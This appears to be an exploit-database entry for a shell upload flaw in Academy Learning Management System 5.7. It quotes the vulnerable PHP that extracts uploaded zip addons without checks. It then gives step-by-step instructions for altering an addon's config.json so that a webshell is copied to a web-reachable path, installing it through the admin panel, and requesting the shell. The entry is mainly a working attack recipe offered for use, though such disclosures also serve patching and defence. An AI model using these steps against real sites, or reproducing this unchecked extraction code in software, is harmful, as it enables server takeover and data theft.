@@ -1,0 +1,60 @@
+id: 37961
+date: 09/14/2022
+title: Academy Learning Management System 5.7 Shell Upload Exploit
+author: th3d1gger
+cves: 
+
+# Exploit Title: Academy Learning Management System 5.7 Shell Upload
+# Exploit Author: th3d1gger
+# Vendor Homepage: https://codecanyon.net
+# Software Link: https://codecanyon.net/item/academy-course-based-learning-management-system/22703468
+# Version: 5.7
+# Tested on Ubuntu 18.04
+
+Totally wrong architecture for uploading zip files on install addon 
+
+---Vulnerable Source Code ---
+$zipped_file_name = $_FILES['addon_zip']['name'];
+
+    if (!empty($zipped_file_name)) {
+      // Create update directory.
+      $dir = 'uploads/addons';
+      if (!is_dir($dir))
+      mkdir($dir, 0777, true);
+
+      $path = "uploads/addons/".$zipped_file_name;
+      if (class_exists('ZipArchive')) {
+        move_uploaded_file($_FILES['addon_zip']['tmp_name'], $path);
+        //Unzip uploaded update file and remove zip file.
+        $zip = new ZipArchive;
+        $zip->open($path);
+        $zip->extractTo('uploads/addons');
+        $zip->close();
+        unlink($path);
+      }else{
+        $this->session->set_flashdata('error_message', get_phrase('your_server_is_unable_to_extract_the_zip_file').'. '.get_phrase('please_enable_the_zip_extension_on_your_server').', '.get_phrase('then_try_again'));
+        redirect(site_url('admin/addon'), 'refresh');
+      }
+
+---Exploit------
+get request route "/admin/addon/add" at admin panel.
+
+And then for example download "certificate addon" nulled version.
+
+in addons config.json file 
+add
+"""
+ {
+            "root_directory"    : "uploads/addons/certificate/others/shell.php",
+            "update_directory"  : "uploads/certificates/shell.php"
+        },
+"""
+
+add your webshell to others folder in addon.
+
+click install addon button.
+
+And ta daa !
+->get request https://your-url/uploads/certificates/shell.php
+
+#  0day.today [2023-03-23]  #
